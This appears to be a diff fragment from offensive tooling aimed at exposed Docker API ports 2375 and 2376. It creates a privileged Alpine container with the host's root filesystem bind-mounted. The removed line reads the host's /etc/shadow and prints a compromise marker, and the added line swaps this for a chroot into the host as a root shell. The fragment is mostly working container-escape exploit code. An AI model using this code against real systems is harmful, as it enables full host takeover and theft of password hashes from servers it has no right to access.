@@ -687,7 +687,7 @@ for port in (2375, 2376):
         # Create the escape container
         esc_body = {{
             "Image": "alpine",
-            "Cmd": ["/bin/sh", "-c", "id; cat /host_root/etc/shadow 2>/dev/null | head -3; echo COMPROMISE: docker_sock_escape_root target={ctx.target_ip}"],
+            "Cmd": ["/bin/sh", "-c", "chroot /host_root /bin/sh"],
             "Privileged": True,
             "Mounts": [{{"Type": "bind", "Source": "/", "Target": "/host_root"}}],
         }}
